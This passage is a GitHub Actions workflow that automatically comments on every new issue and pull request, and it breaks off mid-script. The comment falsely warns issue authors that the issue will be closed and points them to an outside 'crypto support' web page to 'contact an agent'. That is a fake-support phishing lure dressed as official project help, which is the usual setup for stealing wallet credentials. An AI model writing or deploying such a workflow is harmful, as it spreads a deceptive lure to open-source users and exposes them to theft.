name: Comment on Every New Issue and PR

permissions:
  issues: write
  pull-requests: write

on:
  issues:
    types: [opened]
  pull_request_target:
    types: [opened]

jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - name: Comment on Issue or PR
        uses: actions/github-script@v7
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const isIssue = !!context.payload.issue;
            const number = isIssue ? context.payload.issue.number : context.payload.pull_request.number;
            const type = isIssue ? "issue" : "pull request";
            const message = isIssue
              ? "Note: This issue will be automatically closed shortly. For review and assistance resolution contact an agent on the web page to report this via [Web SupportÂ page](https://cryptosupport-live.web.app/) for quick review and assistance."
